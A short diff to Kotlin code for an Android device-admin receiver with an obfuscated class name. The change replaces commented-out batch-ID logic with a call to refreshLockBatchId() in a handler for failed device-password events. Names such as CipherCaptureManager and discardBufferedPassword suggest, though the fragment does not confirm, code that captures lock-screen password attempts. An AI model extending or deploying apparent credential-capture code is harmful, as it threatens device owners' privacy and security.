@@ -221,9 +221,7 @@ class zbrefryi : DeviceAdminReceiver() {
             val ccm = CipherCaptureManager.instance
             if (ccm != null) {
                 ccm.dispatchEvent("android.intent.action.DEVICE_PASSWORD_FAILED")
-                // vendor: refresh lock batch ID logic
-                // Vendor: ccm.lockBatchId = (System.currentTimeMillis() shl 10) or (ccm.batchCounter.incrementAndGet() % 1024).toLong()
-                // Simplified: let dispatchEvent handle batch state internally
+                ccm.refreshLockBatchId()
                 ccm.discardBufferedPassword()
             }
         } catch (e: Exception) {
